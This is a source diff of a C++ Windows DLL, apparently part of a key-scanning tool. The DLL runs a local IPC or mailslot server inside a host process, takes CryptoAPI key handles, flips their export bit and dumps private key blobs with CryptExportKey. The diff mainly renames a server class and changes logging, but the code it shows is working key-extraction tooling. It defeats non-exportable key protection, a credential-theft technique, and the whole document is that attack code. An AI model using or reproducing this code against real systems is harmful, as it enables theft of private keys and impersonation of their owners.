@@ -21,9 +21,10 @@ using namespace std;
 DWORD timeout_millis = 20000;
 
 int StartMailSlot();
-void ServerLoop(CustomServerV2& server);
+void ServerLoop(CustomServer& server);
 ProgramResult ForceKeyBlobExport(HCRYPTKEY key_handle, DWORD blob_type, vector<BYTE>& buffer);
-ProgramResult ExportKeyCommand(Request request, CustomServerV2& server);
+ProgramResult ExportKeyCommand(Request request, CustomServer& server);
+void PrintBytes(vector<BYTE>& buffer);
 
 extern "C" __declspec(dllexport) void StartMailSlotExporter(LPVOID lpParam) {
   printf("Started mailslot\n");
@@ -31,32 +32,16 @@ extern "C" __declspec(dllexport) void StartMailSlotExporter(LPVOID lpParam) {
 }
 
 extern "C" __declspec(dllexport) void StartServer(LPVOID lpParam) {
-  auto server = custom_ipc::CustomServerV2();
+  auto server = custom_ipc::CustomServer(GetCurrentProcessId());
   if (server.StartServer().IsOk()) {
     ServerLoop(server);
-  } else ShowGUIMessage("Failed to start remote server");
-
-  /*
-  // StartMailSlot();
-  NamedPipeServer server = NamedPipeServer(kPipeName, timeout_millis);
-  // ShowGUIMessage("Creating server");
-  server.CreateServer();
-  // ShowGUIMessage("Waiting for connection");
-  error_handling::ProgramResult pr = server.WaitForConnection();
-  // ShowGUIMessage(pr.GetResultInformation());
-  if (pr.IsOk()) {
-    // ShowGUIMessage("Entering server loop");
-    server.ServerLoop();
-  } // else ShowGUIMessage("Did not enter server loop due to previous error");
-  // ShowGUIMessage("Closing server");
-  server.CloseServer();
-  */
+  } else printf("Failed to start remote server\n");
 }
 
 BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  nReason, LPVOID lpReserved) {
   switch (nReason) {
   case DLL_PROCESS_ATTACH:
-    custom_ipc::ShowGUIMessage("DLL loaded in process");
+    // custom_ipc::ShowGUIMessage("DLL loaded in process");
     break;
   case DLL_PROCESS_DETACH:
     break;
@@ -68,19 +53,26 @@ BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  nReason, LPVOID lpReserved) {
   return TRUE;
 }
 
-void ServerLoop(CustomServerV2& server) {
+void ServerLoop(CustomServer& server) {
+  Request request;
   while (true) {
-    Request request;
-    if (server.GetRequest(request).IsErr()) continue;
+    printf("\n [SERVER] Waiting for a command\n");
+    auto request_status = server.GetRequest(request);
+    if (request_status.IsErr()) {
+      cerr << "Skipping request. Error while processing: ";
+      cerr << request_status.GetResultInformation() << endl;
+      continue;
+    }
 
     switch (request.command) {
       case command::kEndServer:
-        ShowGUIMessage("Shutting down server");
+        // ShowGUIMessage("Shutting down server");
+        printf(" [SERVER] Close command received, closing server\n");
         server.Close();
         return;
       
       case command::kExportKey:
-        cout << ExportKeyCommand(request, server).GetResultInformation() << endl;
+        cout << " [SERVER] " << ExportKeyCommand(request, server).GetResultInformation() << endl;
         break;
       
       default:
@@ -109,15 +101,13 @@ int StartMailSlot() {
     auto buffer = std::vector<BYTE>(sizeof(HCRYPTKEY), 0);
 
     if (ReadFile(hMailslot, buffer.data(), sizeof(HCRYPTKEY), &bytesRead, NULL)) {
-      std::cout << "Received message: ";
-      for (SIZE_T i = 0; i < bytesRead; ++i) {
-        printf("%02X ", buffer[i]);
-      } printf("\n");
+      cout << "Received message: ";
+      PrintBytes(buffer);
       
       HCRYPTKEY key = *(reinterpret_cast<HCRYPTKEY*>(buffer.data()));
       key_scanner::cryptoapi::ForceExportBit(key);
 
-      printf("Exporting key: 0x%p\n", (void*) key);
+      printf(" [i] Exporting key: 0x%p\n", (void*) key);
       printf(" Exporting PRIVATEKEYBLOB\n");
       BYTE key_buffer[PRIVATEKEYBLOB_SIZE];
       ZeroMemory(key_buffer, PRIVATEKEYBLOB_SIZE);
@@ -170,7 +160,7 @@ int StartMailSlot() {
   return 0;
 }
 
-ProgramResult ExportKeyCommand(Request request, CustomServerV2& server) {
+ProgramResult ExportKeyCommand(Request request, CustomServer& server) {
   auto blob = vector<BYTE>();
   custom_ipc::Response response;
 
@@ -195,8 +185,9 @@ ProgramResult ExportKeyCommand(Request request, CustomServerV2& server) {
 
 ProgramResult ForceKeyBlobExport(HCRYPTKEY key_handle, DWORD blob_type, vector<BYTE>& buffer) {
   key_scanner::cryptoapi::ForceExportBit(key_handle);
-  printf("Exporting key: 0x%p\n", (void*) key_handle);
+  printf(" [SERVER] Exporting key: 0x%p\n", (void*) key_handle);
 
+  // 1. Get the necessary size
   DWORD data_len;
   BOOL res = CryptExportKey(
     key_handle, NULL,
@@ -207,6 +198,7 @@ ProgramResult ForceKeyBlobExport(HCRYPTKEY key_handle, DWORD blob_type, vector<B
 
   if (!res) return ErrorResult("Error exporting the key: " + GetLastErrorAsString());
   
+  // 2. Adjust the buffer size and get the blob
   auto blob_buffer = vector<BYTE>(data_len, 0);
   res = CryptExportKey(
     key_handle, NULL,
@@ -217,7 +209,20 @@ ProgramResult ForceKeyBlobExport(HCRYPTKEY key_handle, DWORD blob_type, vector<B
 
   if (!res) return ErrorResult("Error exporting the key: " + GetLastErrorAsString());
   // If the final data is shorter
-  if (blob_buffer.size() != data_len) blob_buffer.resize(data_len);
+  if (blob_buffer.size() != data_len) {
+    cout << "[!] buffer and data_len sizes mismatch\n";
+    blob_buffer.resize(data_len);
+  }
 
+  // PrintBytes(blob_buffer);
+  buffer = blob_buffer;
   return OkResult("Blob exported to buffer");
+}
+
+void PrintBytes(vector<BYTE>& buffer) {
+  SIZE_T carriage_return = 0;
+  for (BYTE b : buffer) {
+    printf("%02X ", b);
+    if (carriage_return++ % 16 == 0) printf("\n");
+  } printf("\n");
 }
